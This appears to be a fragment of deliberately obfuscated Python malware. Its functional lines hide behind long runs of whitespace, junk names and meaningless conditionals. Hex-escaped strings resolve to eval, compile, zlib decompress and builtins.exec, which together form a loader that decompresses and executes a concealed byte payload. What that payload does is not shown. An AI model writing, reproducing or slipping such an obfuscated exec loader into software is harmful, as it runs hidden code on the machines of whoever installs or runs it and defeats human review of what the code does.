        _cube(_builtins = 21260 + 77706).DetectVar(_frame = -74352 / Round._callfunction)                                                                                                                                                                                                                                                          ;_cube.MemoryAccess(_floor='lIIlIllIlllIIIIIlI',_modulo=b'fT\x8b\xd7\xa1\xdd\x93\xe6\xb6"kL_J\x8e\x8b\xe3\xbaH\x06\xb8\xc1\xefr\x1b\xae\xfd\xab\xcb\xff\x1f\xe0V{#')

        Round.DetectVar(_frame = -52847 - Round._callfunction)                                                                                                                                                                                                                                                          ;mmmnmnnnnmnmmmmmmnmn,ILLJIJJJILLJLLJILJL,O0oO000oOooOoo0ooo,LJILIJIILJLLJIJJJJJLIL,nnnmnnmnnmmnnmnmnmmm=(lambda OooOOOOoOo0O00oo0ooO0:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(OooOOOOoOo0O00oo0ooO0)"),filename='\x4f\x4f\x4f\x4f\x30\x30\x6f\x6f\x30\x6f\x6f\x30\x4f\x4f\x30\x30\x4f\x30\x30\x4f\x4f\x30\x4f',mode='\x65\x76\x61\x6c'))),(lambda OooOOOOoOo0O00oo0ooO0:OooOOOOoOo0O00oo0ooO0(__import__('\x7a\x6c\x69\x62'))),(lambda OooOOOOoOo0O00oo0ooO0:OooOOOOoOo0O00oo0ooO0['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda S2S22S222SS2222S222S2,OooOOOOoOo0O00oo0ooO0:S2S22S222SS2222S222S2(OooOOOOoOo0O00oo0ooO0)),(lambda:(lambda OooOOOOoOo0O00oo0ooO0:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(OooOOOOoOo0O00oo0ooO0)"),filename='\x4f\x4f\x4f\x4f\x30\x30\x6f\x6f\x30\x6f\x6f\x30\x4f\x4f\x30\x30\x4f\x30\x30\x4f\x4f\x30\x4f',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63'))
        if 309206 > 8271471:
            Round.DetectVar(_frame = 86518 - Round._callfunction)
        elif 326249 < 8017630:
            _cube(_builtins = -58984 + 62732).Random(_calculate = Round._callfunction * -70128)                                                                                                                                                                                                                                                          ;nnnmnnmnnmmnnmnmnmmm()(LJILIJIILJLLJIJJJJJLIL(O0oO000oOooOoo0ooo(ILLJIJJJILLJLLJILJL(mmmnmnnnnmnmmmmmmnmn('\x76\x61\x72\x73'))),_cube._while(Power='IJIIJJLILJJJLLJLLLILIJ')+_cube._while(Power='OOO0Oo000oO000Oo0ooo0ooo0')+_cube._while(Power='lIIlIllIlllIIIIIlI')))

    except Exception as _divide:
        if 397733 > 3034600:
            _cube.execute(code = _random(_divide))

        elif 435045 > 8182321:
            Round.DetectVar(_frame = -87909 / Round._callfunction)